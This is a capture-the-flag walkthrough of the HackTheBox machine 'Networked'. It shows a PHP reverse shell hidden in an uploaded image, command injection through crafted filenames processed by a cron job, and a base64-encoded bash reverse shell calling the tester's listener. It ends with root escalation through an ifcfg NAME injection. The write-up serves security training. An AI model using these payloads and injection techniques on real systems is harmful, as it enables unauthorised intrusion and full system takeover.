# Networked | HackTheBox

### 1. Scan
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -p- -T4 10.129.150.153
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 23:02 EST
Nmap scan report for 10.129.150.153
Host is up, received echo-reply ttl 63 (0.29s latency).
Scanned at 2021-05-25 05:20:42 EDT for 392s
Not shown: 65532 filtered ports
Reason: 65163 no-responses and 369 host-prohibiteds
PORT    STATE  SERVICE REASON         VERSION
22/tcp  open   ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFgr+LYQ5zL9JWnZmjxP7FT1134sJla89HBT+qnqNvJQRHwO7IqPSa5tEWGZYtzQ2BehsEqb/PisrRHlTeatK0X8qrS3tuz+l1nOj3X/wdcgnFXBrhwpRB2spULt2YqRM49aEbm7bRf2pctxuvgeym/pwCghb6nSbdsaCIsoE+X7QwbG0j6ZfoNIJzQkTQY7O+n1tPP8mlwPOShZJP7+NWVf/kiHsgZqVx6xroCp/NYbQTvLWt6VF/V+iZ3tiT7E1JJxJqQ05wiqsnjnFaZPYP+ptTqorUKP4AenZnf9Wan7VrrzVNZGnFlczj/BsxXOYaRe4Q8VK4PwiDbcwliOBd
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAsf1XXvL55L6U7NrCo3XSBTr+zCnnQ+GorAMgUugr3ihPkA+4Tw2LmpBr1syz7Z6PkNyQw6NzC3KwSUy1BOGw8=
|   256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMrhnJBfdb0fWQsWVfynAxcQ8+SNlL38vl8VJaaqPTL
80/tcp  open   http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https   reset ttl 63
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 5.1 (94%), HP P2000 G3 NAS device (91%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 - 4.6 (90%), Linux 4.10 (90%), Linux 4.2 (90%), Linux 4.4 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=5/25%OT=22%CT=443%CU=%PV=Y%DS=2%DC=T%G=N%TM=60ACC2F2%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=2%ISR=10B%TI=Z%II=I%TS=A)
SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.002 days (since Tue May 25 05:24:50 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   299.74 ms 10.10.14.1
2   299.73 ms 10.129.150.153

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 25 05:27:14 2021 -- 1 IP address (1 host up) scanned in 391.88 seconds

```

### 2. Check out the website
The front page is simple, with the text:
  
*Hello mate, we're building the new FaceMash!  
Help by funding us and be the new Tyler&Cameron!  
Join us at the pool party this Sat to get a glimpse*  
  
In the source code there is a comment:
```html
<!-- upload and gallery not yet linked -->
```

Knowing there is an upload and gallery page somewhere, do some searching and find:
- /upload.php, which has a simple upload form. Clicking the button with in file indicates it wants an image file.
- /photos.php, found from running a dirbust on the site as seen below.
```bash
┌──(kali㉿kali)-[10.10.14.24]-[~/Desktop]
└─$ recursebuster -ext php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -u http://10.129.150.153                                                                     1 ⨯
INFO: Starting recursebuster...
INFO: Dirbusting http://10.129.150.153/
GOOD: Found GET http://10.129.150.153/photos.php [200 OK]
GOOD: Found GET http://10.129.150.153/upload.php [200 OK]
GOOD: Found GET http://10.129.150.153/lib.php [200 OK]
```
Testing out the upload form further shows that anything uploaded using the form is inserted into the photos.php page. The fact that the image is inserted directly means that it should be possible to upload an image that can bypass filters and execute code.

### 3. Get a shell
A few tests went a long way to revealing the nature of the upload form.
- Any non-image extension at the end of the file will not upload.
- Any image with a content-type which is not an image file will not upload.
So the file must end with .jpg (or some image format extension).
  
To evade this filter I simply took a plain image and appended PHP reverse shell code to the end of it. When uploading, this appeared to the application as a normal image file, and because it was placed directly in the page, the PHP code executed.
```bash
┌──(kali㉿kali)-[10.10.14.24]-[~/Desktop]
└─$ nc -lvnp 9999                
listening on [any] 9999 ...
connect to [10.10.14.24] from (UNKNOWN) [10.129.150.153] 56676
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:49:30 up 29 min,  0 users,  load average: 0.05, 0.06, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ python -c "import pty; pty.spawn('/bin/bash')"
python -c "import pty; pty.spawn('/bin/bash')"
bash-4.2$ whoami
apache
```

### 4. Enumerate from user
Checking out the site files, there is a backup directory with a tar file owned by root.
```bash
bash-4.2$ ls
ls
backup  index.php  lib.php  photos.php  upload.php  uploads
bash-4.2$ ls -ls backup
ls -ls backup
total 12
12 -rw-r--r-- 1 root root 10240 Jul  9  2019 backup.tar
```
Because the file is still readable by everyone, I can use strings on it and read data inside it, but don't see anything of interest. Looking at other users on the machine, there is one user called "Guly". Their home folder is accessible with some readable files.
```bash
bash-4.2$ ls -la
ls -la
total 28
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```
One file is the crontab for the user.
```bash
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```
The crontab regulary runs the check_attack.php file every third minute.
```bash
bash-4.2$ cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
The code checks the files in the uploads directory and validates if the IP address in the filename is valid. If it isn't, it will write out a log file, then delete it using exec(), before using exec() again to delete the image file. Finally it sends mail to Guly. It may be possible to inject into this exec command with the right filename.
  
For a proof-of-concept, create a file in the uploads directory with the name `; echo 'hello' > testfile`.
```bash
bash-4.2$ echo reee > "; echo 'hello' > testfile"
echo reee > "; echo 'hello' > testfile"
bash-4.2$ ls
ls
127_0_0_1.png  127_0_0_2.png  127_0_0_3.png  127_0_0_4.png  ; echo 'hello' > testfile  index.html
```
Wait a few minutes, then check the user's home directory.
```bash
bash-4.2$ ls -l /home/guly
ls -l /home/guly
total 12
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-rw-r--r--  1 guly guly   0 May 25 13:06 testfile
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```
The test file exists.

### 5. Lateral movement
Encode a bash reverse shell and pipe it to bash within a filename. The shell needs to be Base64-encoded as filenames cannot contain the forward-slash character.
```bash
bash-4.2$ echo "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNC85OTk4IDA+JjE= | base64 -d | bash;"            
bash-4.2$ ls -la
total 8
drwxrwxrwx. 2 root   root   115 May 25 13:41 .
drwxr-xr-x. 4 root   root   103 Jul  9  2019 ..
-rw-rw-rw-  1 apache apache   5 May 25 13:41 ; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNC85OTk4IDA+JjE= | base64 -d | bash;
-rw-rw-rw-  1 apache apache   6 May 25 13:40 index.html
```
Wait a few minutes...
```bash
┌──(kali㉿kali)-[10.10.14.24]-[~/Desktop]
└─$ nc -lvnp 9998       
listening on [any] 9998 ...
connect to [10.10.14.24] from (UNKNOWN) [10.129.150.153] 59406
bash: no job control in this shell
[guly@networked ~]$ id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
```

### 6. Enumerate from user
Hit sudo -l:
```bash
[guly@networked tmp]$ sudo -l 
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```
Look at the shell script.
```bash
[guly@networked tmp]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
This script is reading input to a variable, then performing some regex on the variable before echoing the variable's assignment into the network script file. This seems like more opportunity for command injection. Some reseach into network script exploits indicates this is possible. From https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f:

*If, for whatever reason, a user is able to write an ifcf-<whatever>; script to /etc/sysconfig/network-scripts or it can 
adjust an existing one, then your system in pwned.  
Network scripts, ifcg-eth0 for example are used for network connections. The look exactly like .INI files. However, 
they are ~sourced~ on Linux by Network Manager (dispatcher.d).  
In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in 
the name the system tries to execute the part after the white/blank space. Which means; everything after the first 
blank space is executed as root.  
For example:  
/etc/sysconfig/network-scripts/ifcfg-1337  
NAME=Network /bin/id <= Note the blank space  
ONBOOT=yes  
DEVICE=eth0*
  
Looking at it, it seems as though the regex the input is tested against will allow for a blank space and slashes. This means commands can be executed as root.

### 7. Escalate to root
The interface name is provided as "network /bin/bash ", which spawns a shell.
```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
network /bin/bash
interface PROXY_METHOD:
dsa
interface BROWSER_ONLY:
asd
interface BOOTPROTO:
asd
whoami
root
python -c "import pty;pty.spawn('/bin/bash')"
[root@networked network-scripts]#
```